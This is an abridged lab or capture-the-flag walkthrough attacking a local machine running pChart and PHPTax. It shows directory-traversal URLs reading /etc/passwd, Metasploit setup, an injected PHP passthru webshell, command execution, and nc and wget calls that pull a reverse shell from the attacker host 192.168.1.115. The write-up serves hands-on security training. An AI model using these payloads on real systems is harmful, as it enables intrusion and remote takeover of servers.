...
>Starting Nmap 7.60 ( https://nmap.org ) at 2018-05-04 20:34 CEST  
...
http://192.168.1.59/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fetc/passwd  
...
http://192.168.1.59/pChart2.1.3/examples/index.php?Action=View&Script=%2f..%2f..%2fusr/local/etc/apache22/httpd.conf  
...
>kali@kali:~$ curl http://192.168.1.59:8080 -H 'User-Agent: Mozilla/4.0' -v  
>* Rebuilt URL to: http://192.168.1.59:8080/  
>*   Trying 192.168.1.59...  
>* TCP_NODELAY set  
...
msf exploit(multi/http/phptax_exec) > show options  
msf exploit(multi/http/phptax_exec) > set rhost 192.168.1.59  
>rhost => 192.168.1.59  
...
kali@kali:~$ wget https://www.exploit-db.com/download/26368.c  
...
http://192.168.1.59:8080/phptax/index.php?field=rce.php&newvalue=%3C%3Fphp%20passthru%28%24_GET[cmd]%29%3B%3F%3E  

And we got our non-interactive shell.  

http://192.168.1.59:8080/phptax/data/rce.php?cmd=id  
>uid=80(www) gid=80(www) groups=80(www)   

Let's spawn an actual shell. We run the apache and place a reverse shell to pick it up from the server:  

http://192.168.1.59:8080/phptax/data/rce.php?cmd=wget%20192.168.1.115/php-shell-reverse.php  

Oh, I forgot, there was no wget. So, same way, with our friend nc:  

http://192.168.1.59:8080/phptax/data/rce.php?cmd=nc%20192.168.1.115%204445%20%3E%20reverse.php  
...
http://192.168.1.59:8080/phptax/data/reverse.php  
